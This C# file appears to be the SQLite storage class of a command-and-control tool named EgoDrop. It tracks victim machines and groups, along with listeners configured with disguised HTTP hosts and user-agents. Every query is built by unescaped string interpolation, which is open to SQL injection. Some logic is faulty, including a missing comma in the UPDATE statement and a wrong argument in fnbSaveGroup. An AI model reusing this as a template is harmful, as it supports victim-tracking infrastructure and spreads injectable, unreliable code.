using System;
using System.Collections.Generic;
using System.Data;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

using System.Data.SQLite;
using System.Data.Entity.Core.Metadata.Edm;
using System.Xml.Linq;

namespace EgoDrop
{
    public class clsSqlite
    {
        /// <summary>
        /// Database structure.
        /// </summary>
        private Dictionary<string, string[]> m_dicDbStructure = new Dictionary<string, string[]>()
        {
            {
                //Log.
                "Logs", new string[]
                {
                    "Type", //Log type: System, Error
                    "OnlineID", //Victim online ID
                    "Func", //Function
                    "Message", //Log message.
                    "CreationDate", //Log creation date.
                }
            },
            {
                //Victim group.
                "Group", new string[]
                {
                    "Name",
                    "CreationDate",
                }
            },
            {
                //Victim configuration.
                "Victim", new string[]
                {
                    "OnlineID",
                    "Dir",
                    "OS",
                    "KLF",
                    "PD",
                    "CreationDate",
                    "LastOnlineDate",
                    "Uptime",
                }
            },
            {
                //Listener configuration.
                "Listener", new string[]
                {
                    "Name", //Listener's name.
                    "Protocol", //Listener's protocol.
                    "Port", //Listener's port for listening.
                    "Description", //Listener's description.
                    "CreationDate", //Creation date.

                    "CertPath", //SSL certificate file path.
                    "CertPassword", //SSL certificate file password.

                    "HttpHost", //HTTP request remote host.
                    "HttpMethod", //HTTP request method(GET/POST/HEAD/PUT/DELETE).
                    "HttpPath", //HTTP request resource.
                    "HttpUA", //HTTP user-agent.
                }
            },
        };

        #region Property

        private string m_szFileName { get; set; } //SQLite3 file path.
        private string m_szConnString { get { return $"Data Source={m_szFileName};Compress=True;"; } } //SQLite3 connection string.
        private SQLiteConnection m_sqlConn { get; set; } //SQLite3 connection object.

        #endregion
        #region Event

        public delegate void dlgLogSystemEventHandler(clsListener listener, clsVictim victim, string szMsg);
        public event dlgLogSystemEventHandler evtNewSystemLog;
        public delegate void dlgLogErrorEventHandler(clsListener listener, clsVictim victim, string szMsg);
        public event dlgLogErrorEventHandler evtNewErrorLog;

        #endregion
        #region Struct

        /// <summary>
        /// Listener struct.
        /// </summary>
        public struct stListener
        {
            public string szName                    { get; set; } //Listerner's name.
            public enListenerProtocol protoListener { get; set; } //Protocol.
            public int nPort                        { get; set; } //Port.
            public string szDescription             { get; set; } //Description.
            public DateTime dtCreationDate          { get; set; } //Creation date.

            public string szCertPath                { get; set; } //OpenSSL certificate file path.
            public string szCertPassword            { get; set; } //OpenSSL certificate file password.

            public string szHttpHost                { get; set; } //Fake HTTP request host.
            public enHttpMethod httpMethod          { get; set; } //HTTP method(GET/POST/HEAD/PUT/DELETE).
            public string szHttpPath                { get; set; } //HTTP request resource.
            public string szHttpUA                  { get; set; } //HTTP user-agent.

            /// <summary>
            /// Overload(Ordinary RSA + AES communication).
            /// </summary>
            /// <param name="szName">Listener's name.</param>
            /// <param name="proto">Protocol.</param>
            /// <param name="nPort">Listener's port.</param>
            /// <param name="szDescription">Description.</param>
            /// <param name="dtDate">Creation data.</param>
            public stListener(
                string szName,            //Listener's name.
                enListenerProtocol proto, //Listener protocol.
                int nPort,                //Listener port.
                string szDescription,     //Listener description.
                DateTime dtDate           //Creation date.
            )
            {
                this.szName        = szName;
                protoListener      = proto;
                this.nPort         = nPort;
                this.szDescription = szDescription;
                dtCreationDate     = dtDate;

                szCertPath         = string.Empty;
                szCertPassword     = string.Empty;

                szHttpHost         = string.Empty;
                httpMethod         = enHttpMethod.GET;
                szHttpPath         = "/";
                szHttpUA           = string.Empty;
            }

            /// <summary>
            /// Overload(TLS communication).
            /// </summary>
            /// <param name="szName">Listener's name.</param>
            /// <param name="proto">Listener's protocol.</param>
            /// <param name="nPort">Listener's port.</param>
            /// <param name="szDescription">Listener's description.</param>
            /// <param name="dtDate">Creation date.</param>
            /// <param name="szCertPath">Certificate file path.</param>
            /// <param name="szCertPassword">Certificate file password.</param>
            public stListener(
                string szName,            //Listener's name.
                enListenerProtocol proto, //Listener's protocol.
                int nPort,                //Listener's port.
                string szDescription,     //Listener's description.
                DateTime dtDate,          //Creation date.

                string szCertPath,        //Certificate file path.
                string szCertPassword     //Certificate file password.
            )
            {
                this.szName         = szName;
                protoListener       = proto;
                this.nPort          = nPort;
                this.szDescription  = szDescription;
                dtCreationDate      = dtDate;

                this.szCertPath     = szCertPath;
                this.szCertPassword = szCertPassword;

                szHttpHost          = string.Empty;
                httpMethod          = enHttpMethod.GET;
                szHttpPath          = "/";
                szHttpUA            = string.Empty;
            }

            /// <summary>
            /// Overload(HTTP communication).
            /// </summary>
            /// <param name="szName">Listener's name.</param>
            /// <param name="proto">Listener's protocol.</param>
            /// <param name="nPort">Listener's port.</param>
            /// <param name="szDescription">Listener's description.</param>
            /// <param name="dtDate">Creation date.</param>
            /// <param name="szHttpHost">HTTP request host.</param>
            /// <param name="httpMethod">HTTP request method(GET/POST/HEAD/PUT/DELETE).</param>
            /// <param name="szHttpPath">HTTP request resource.</param>
            /// <param name="szHttpUA">HTTP user-agent.</param>
            public stListener(
                string szName,            //Listener's name.
                enListenerProtocol proto, //Listener's protocol.
                int nPort,                //Listener's port.
                string szDescription,     //Listener's description.
                DateTime dtDate,          //Creation date.

                string szHttpHost,        //HTTP request host.
                enHttpMethod httpMethod,  //HTTP request method.
                string szHttpPath,        //HTTP request resource.
                string szHttpUA           //HTTP user-agent.
            )
            {
                this.szName        = szName;
                protoListener      = proto;
                this.nPort         = nPort;
                this.szDescription = szDescription;
                dtCreationDate     = dtDate;

                szCertPath         = string.Empty;
                szCertPassword     = string.Empty;

                this.szHttpHost    = szHttpHost;
                this.httpMethod    = httpMethod;
                this.szHttpPath    = szHttpPath;
                this.szHttpUA      = szHttpUA;
            }

        };

        #endregion
        #region Enum

        /// <summary>
        /// 
        /// </summary>
        public enum enListenerProtocol
        {
            TCP,
            TLS,
            DNS,
            HTTP,
        };

        /// <summary>
        /// 
        /// </summary>
        public enum enHttpMethod
        {
            GET,
            POST,
            HEAD,
            PUT,
            DELETE,
        };

        #endregion

        /// <summary>
        /// Sqlite3 object handler.
        /// </summary>
        /// <param name="szFileName">*.sqlite file path.</param>
        public clsSqlite(string szFileName)
        {
            m_szFileName = szFileName;
            m_sqlConn    = new SQLiteConnection(m_szConnString);

            //DB init.
            if (File.Exists(szFileName))
            {
                m_sqlConn.Open();
            }
            else
            {
                m_sqlConn.Open();
                foreach (string szTable in m_dicDbStructure.Keys)
                    fnCreateTable(szTable);
            }
        }

        private void fnCreateTable(string szTableName)
        {
            string szQuery = string.Join(", ", m_dicDbStructure[szTableName].Select(x => $"{x} TEXT"));
            szQuery        = $"CREATE TABLE \"{szTableName}\" ({szQuery});";

            fnQuery(szQuery);
        }

        /// <summary>
        /// Execute SQL query and return result as DataTable.
        /// </summary>
        /// <param name="szQuery">SQL query string.</param>
        /// <returns>The output will be stored in DataTable.</returns>
        private DataTable fnQuery(string szQuery)
        {
            DataTable dt = new DataTable();
            try
            {
                using (var adapter = new SQLiteDataAdapter(szQuery, m_sqlConn))
                {
                    DataSet ds = new DataSet();
                    adapter.Fill(ds);

                    if (ds.Tables.Count > 0)
                        dt = ds.Tables[0];
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "fnQuery()", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }

            return dt;
        }

        #region Listener

        /// <summary>
        /// Check listener is available.
        /// </summary>
        /// <param name="szName">Listener's name.</param>
        /// <returns></returns>
        private bool fnbListenerExist(string szName)
        {
            try
            {
                string szQuery = $"SELECT EXISTS(SELECT 1 FROM \"Listener\" WHERE \"Name\" = \"{szName}\");";
                DataTable dt   = fnQuery(szQuery);

                return (Int64)dt.Rows[0][0] == (Int64)1; //Convert result into int(64-bit).
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "fnbListenerExist()", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            finally
            {
                
            }

            return false;
        }

        /// <summary>
        /// Validate two specified listener are equal.
        /// </summary>
        /// <param name="lA"></param>
        /// <param name="lB"></param>
        /// <returns></returns>
        private bool fnbListenerIsEqual(stListener lA, stListener lB)
        {
            return (
                lA.szName        == lB.szName && 
                lA.protoListener == lB.protoListener &&
                lA.nPort         == lB.nPort &&
                lA.szDescription == lB.szDescription
            );
        }

        /// <summary>
        /// Get listener through specified name.
        /// </summary>
        /// <param name="szName">Listener name.</param>
        /// <returns></returns>
        public stListener fnGetListener(string szName)
        {
            var listeners = fnGetListeners();
            foreach (var l in listeners)
            {
                if (l.szName == szName)
                {
                    return l;
                }
            }

            return new stListener();
        }
        public List<stListener> fnGetListeners()
        {
            List<stListener> lsListener = new List<stListener>();

            try
            {
                string szQuery = "SELECT * FROM \"Listener\";";
                DataTable dt = fnQuery(szQuery);

                foreach (DataRow dr in dt.Rows)
                {
                    string szName            = (string)dr["Name"];
                    int nPort                = int.Parse((string)dr["Port"]);
                    string szDescription     = (string)dr["Description"];

                    enListenerProtocol proto = (enListenerProtocol)Enum.Parse(typeof(enListenerProtocol), (string)dr["Protocol"]);
                    DateTime date            = DateTime.Parse((string)dr["CreationDate"]);

                    string szCertPath        = (string)dr["CertPath"];
                    string szCertPassword    = (string)dr["CertPassword"];

                    string szHttpHost        = (string)dr["HttpHost"];
                    enHttpMethod httpMethod  = (enHttpMethod)Enum.Parse(typeof(enHttpMethod), (string)dr["HttpMethod"]);
                    string szHttpPath        = (string)dr["HttpPath"];
                    string szHttpUA          = (string)dr["HttpUA"];

                    stListener st = new stListener();
                    switch (proto)
                    {
                        case enListenerProtocol.TCP:
                            st = new stListener(
                                szName,
                                proto,
                                nPort,
                                szDescription,
                                date
                            );
                            break;
                        case enListenerProtocol.TLS:
                            st = new stListener(
                                szName,
                                proto,
                                nPort,
                                szDescription,
                                date,

                                szCertPath,
                                szCertPassword
                            );
                            break;
                        case enListenerProtocol.HTTP:
                            st = new stListener(
                                szName,
                                proto,
                                nPort,
                                szDescription,
                                date,

                                szHttpHost,
                                httpMethod,
                                szHttpPath,
                                szHttpUA
                            );
                            break;
                    }

                    lsListener.Add(st);
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "fnGetListener()", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }

            return lsListener;
        }

        public void fnSaveListener(stListener listener)
        {
            try
            {
                string szQuery = string.Empty;
                if (fnbListenerExist(listener.szName))
                {
                    DialogResult dr = MessageBox.Show(
                        $"\"{listener.szName}\" is existed, do you want to replace it?",
                        "Same name.",
                        MessageBoxButtons.YesNo,
                        MessageBoxIcon.Warning
                    );

                    if (dr != DialogResult.Yes)
                        return;

                    szQuery = $"UPDATE \"Listener\" SET " +
                        $"\"Protocol\"=\"{Enum.GetName(listener.protoListener)}\"," +
                        $"\"Port\"=\"{listener.nPort}\"," +
                        $"\"Description\"=\"{listener.szDescription}\"," +
                        $"\"CreationDate\"=\"{listener.dtCreationDate.ToString("F")}\"," +

                        $"\"CertPath\"=\"{listener.szCertPath}\"," +
                        $"\"CertPassword\"=\"{listener.szCertPassword}\"" +

                        $"\"HttpHost\"=\"{listener.szHttpHost}\"," +
                        $"\"HttpMethod\"=\"{Enum.GetName(listener.httpMethod)}\"," +
                        $"\"HttpPath\"=\"{listener.szHttpPath}\"," +
                        $"\"HttpUA\"=\"{listener.szHttpUA}\" " +
                        $"WHERE \"Name\"=\"{listener.szName}\"" +
                        $";";
                }
                else
                {
                    szQuery = $"INSERT INTO \"Listener\" VALUES " +
                        $"(" +
                        $"\"{listener.szName}\"," +
                        $"\"{Enum.GetName(listener.protoListener)}\"," +
                        $"\"{listener.nPort}\"," +
                        $"\"{listener.szDescription}\"," +
                        $"\"{listener.dtCreationDate.ToString("F")}\"," +

                        $"\"{listener.szCertPath}\"," +
                        $"\"{listener.szCertPassword}\"," +
                        
                        $"\"{listener.szHttpHost}\"," +
                        $"\"{Enum.GetName(listener.httpMethod)}\"," +
                        $"\"{listener.szHttpPath}\"," +
                        $"\"{listener.szHttpUA}\"" +
                        
                        $");";
                }

                fnQuery(szQuery);

                if (!fnbListenerIsEqual(listener, fnGetListener(listener.szName)))
                    throw new Exception("Save listener failed!");
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "fnSaveListener()", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        public void fnDeleteListener(string szName)
        {
            try
            {
                string szQuery = $"DELETE FROM \"Listener\" WHERE \"Name\"=\"{szName}\";";
                fnQuery(szQuery);

                if (!string.IsNullOrEmpty(fnGetListener(szName).szName))
                    throw new Exception("Delete listener failed.");
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "fnDeleteListener()", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        #endregion

        #region Group

        /// <summary>
        /// Check group existence.
        /// </summary>
        /// <param name="szName">Group name.</param>
        /// <returns></returns>
        public bool fnbGroupExists(string szName)
        {
            string szQuery = $"SELECT EXISTS(SELECT 1 FROM \"Group\" WHERE \"Name\" = \"{szName}\");";
            DataTable dt = fnQuery(szQuery);

            return (Int64)dt.Rows[0][0] == (Int64)1;
        }

        /// <summary>
        /// Get group names.
        /// </summary>
        /// <returns>Group names.</returns>
        public List<string> fnlsGetGroups()
        {
            List<string> ls = new List<string>();

            string szQuery = "SELECT \"Name\" FROM \"Group\";";
            DataTable dt = fnQuery(szQuery);

            foreach (DataRow dr in dt.Rows)
                ls.Add((string)dr[0]);

            return ls;
        }

        public bool fnbDeleteGroup(string szName)
        {
            string szQuery = $"DELETE FROM \"Group\" WHERE \"Name\"=\"{szName}\" ;";
            if (fnbGroupExists(szName))
            {
                fnQuery(szQuery);

                return !fnbGroupExists(szName);
            }
            else
            {
                MessageBox.Show($"Cannot find group[{szName}]", "fnbDeleteGroup()", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return false;
            }
        }

        public bool fnbSaveGroup(string szGroupName)
        {
            try
            {
                //Check group existence, delete it if exists.
                if (fnbGroupExists(szGroupName))
                {
                    if (!fnbDeleteGroup(szGroupName))
                    {
                        throw new Exception($"Delete group[{szGroupName}] failed.");
                    }
                }

                //Write
                string szQuery = $"INSERT INTO \"Group\" VALUES (\"{szGroupName}\", \"{DateTime.Now.ToString("F")}\");";
                fnQuery(szQuery);

                return fnbGroupExists(szQuery);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "fnbSaveGroup", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return false;
            }
        }

        #endregion
    }
}
